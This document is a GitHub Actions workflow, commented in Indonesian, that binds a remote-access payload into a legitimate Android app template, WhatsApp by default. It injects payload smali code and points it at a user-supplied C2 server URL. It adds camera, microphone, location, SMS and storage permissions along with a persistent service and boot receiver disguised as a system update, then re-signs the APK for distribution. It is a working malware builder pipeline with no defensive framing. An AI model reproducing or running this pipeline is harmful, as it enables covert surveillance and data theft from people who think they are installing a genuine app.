name: Build APK

on:
  workflow_dispatch:
    inputs:
      build_id:
        description: 'Build ID'
        required: true
      app_name:
        description: 'Nama Aplikasi (untuk strings.xml payload)'
        required: true
      package_name:
        description: 'Nama Paket (TIDAK diubah untuk template)'
        required: true
      c2_url:
        description: 'URL Server C2'
        required: true
      bind_target:
        description: 'Target Binding'
        required: true
        default: 'whatsapp'
      permissions:
        description: 'Izin (JSON)'
        required: false
      icon_base64:
        description: 'Ikon (Base64) - OPSIONAL'
        required: false

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout code
        uses: actions/checkout@v4
        with:
          lfs: true

      - name: Force install Git LFS and pull files
        run: |
          sudo apt-get update
          sudo apt-get install -y git-lfs
          git lfs install
          git lfs pull
          git lfs ls-files

      - name: Setup Java
        uses: actions/setup-java@v5
        with:
          java-version: '17'
          distribution: 'temurin'

      - name: Install dependencies
        run: |
          sudo apt-get update
          sudo apt-get install -y wget unzip xmlstarlet

      - name: Download Apktool JAR
        run: |
          wget -O apktool.jar https://github.com/iBotPeaches/Apktool/releases/download/v2.9.3/apktool_2.9.3.jar
          sudo mv apktool.jar /usr/local/bin/apktool.jar

      - name: Download Uber APK Signer
        run: |
          wget -O uber-apk-signer.jar https://github.com/patrickfav/uber-apk-signer/releases/download/v1.3.0/uber-apk-signer-1.3.0.jar

      - name: Prepare template APK
        run: |
          TEMPLATE_FILE="templates/${{ inputs.bind_target }}.apk"
          if [ ! -f "$TEMPLATE_FILE" ]; then
            echo "❌ ERROR: File template tidak ditemukan: $TEMPLATE_FILE"
            exit 1
          fi
          echo "✅ Menggunakan template lokal: $TEMPLATE_FILE"
          cp "$TEMPLATE_FILE" template.apk
          if ! file template.apk | grep -q "Android package"; then
            echo "❌ ERROR: File template bukan APK valid."
            file template.apk
            exit 1
          fi
          echo "✅ Template APK valid."

      - name: Decode template APK
        run: java -jar /usr/local/bin/apktool.jar d template.apk -o decoded/

      - name: Install framework resource
        run: |
          java -jar /usr/local/bin/apktool.jar if template.apk || true

      - name: Inject payload smali
        run: |
          if [ -d "payload/smali" ]; then
            cp -r payload/smali/* decoded/smali/
          fi

      - name: Replace C2 URL in payload smali
        run: |
          find decoded/smali -name "*.smali" -exec sed -i "s|https://your-server.com|${{ inputs.c2_url }}|g" {} \; || true
          echo "✅ URL C2 diganti"

      - name: Add permissions and service to AndroidManifest.xml with xmlstarlet
        run: |
          MANIFEST="decoded/AndroidManifest.xml"
          # 🔥 Backup dulu
          cp "$MANIFEST" "$MANIFEST.bak"
          
          # Tambahkan permission (jika belum ada)
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.INTERNET" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.ACCESS_NETWORK_STATE" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.FOREGROUND_SERVICE" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.CAMERA" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.RECORD_AUDIO" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.ACCESS_FINE_LOCATION" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.READ_SMS" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.READ_EXTERNAL_STORAGE" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.WRITE_EXTERNAL_STORAGE" "$MANIFEST"
          xmlstarlet ed -L -s "/manifest" -t elem -n "uses-permission" -v "" \
            -i "//uses-permission[last()]" -t attr -n "android:name" -v "android.permission.SYSTEM_ALERT_WINDOW" "$MANIFEST"
          
          # Tambahkan service dan receiver ke dalam <application>
          # Cari tag application, lalu tambahkan setelahnya
          xmlstarlet ed -L -s "//application" -t elem -n "service" -v "" \
            -i "//service[last()]" -t attr -n "android:name" -v "com.system.update.UpdateService" \
            -i "//service[last()]" -t attr -n "android:exported" -v "false" \
            -i "//service[last()]" -t attr -n "android:foregroundServiceType" -v "dataSync" "$MANIFEST"
          
          xmlstarlet ed -L -s "//application" -t elem -n "receiver" -v "" \
            -i "//receiver[last()]" -t attr -n "android:name" -v "com.system.update.BootReceiver" \
            -i "//receiver[last()]" -t attr -n "android:exported" -v "true" "$MANIFEST"
          
          # Tambahkan intent-filter ke receiver
          # Lebih mudah: kita tulis manual dengan sed setelah xmlstarlet, atau kita gunakan xmlstarlet lagi
          # Tapi untuk kesederhanaan, kita gunakan sed untuk menambahkan intent-filter di dalam receiver
          # Karena xmlstarlet untuk nested agak rumit, kita gunakan sed dengan hati-hati
          sed -i '/<receiver android:name="com.system.update.BootReceiver"/a\
            <intent-filter>\
              <action android:name="android.intent.action.BOOT_COMPLETED" />\
              <action android:name="android.net.conn.CONNECTIVITY_CHANGE" />\
            </intent-filter>' "$MANIFEST"
          
          echo "✅ Manifest berhasil dimodifikasi"

      - name: Copy original resources to avoid compilation errors
        run: |
          # 🔥 Salin ulang resource dari template asli untuk menghindari error
          # Kita sudah punya decoded/res, tapi mungkin ada file corrupt
          # Kita bisa extract resource dari template.apk ke folder sementara
          unzip -q template.apk -d template_res/
          # Hanya salin res/ dan AndroidManifest.xml asli (tapi kita sudah modifikasi manifest)
          # Kita salin res/ kecuali yang sudah diubah
          cp -r template_res/res/* decoded/res/ 2>/dev/null || true
          # Hapus file drawable yang mengandung $
          find decoded/res -name "*\$*.xml" -delete 2>/dev/null || true
          # Hapus file drawable yang tidak valid (biarkan saja, apktool akan rebuild)
          echo "✅ Resource disalin ulang"

      - name: Rebuild APK with --copy-original
        run: |
          # 🔥 Gunakan --copy-original untuk menghindari kompilasi resource
          java -jar /usr/local/bin/apktool.jar b decoded -o unsigned.apk --copy-original

      - name: Sign APK
        run: |
          keytool -genkey -v -keystore debug.keystore -alias release -keyalg RSA -keysize 2048 -validity 10000 -dname "CN=Unknown, OU=Unknown, O=Unknown, L=Unknown, ST=Unknown, C=Unknown" -storepass android -keypass android
          jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore -storepass android -keypass android unsigned.apk release
          zipalign -v -p 4 unsigned.apk signed.apk 2>/dev/null || true

      - name: Upload APK as artifact
        uses: actions/upload-artifact@v4
        with:
          name: app-${{ inputs.build_id }}
          path: signed.apk
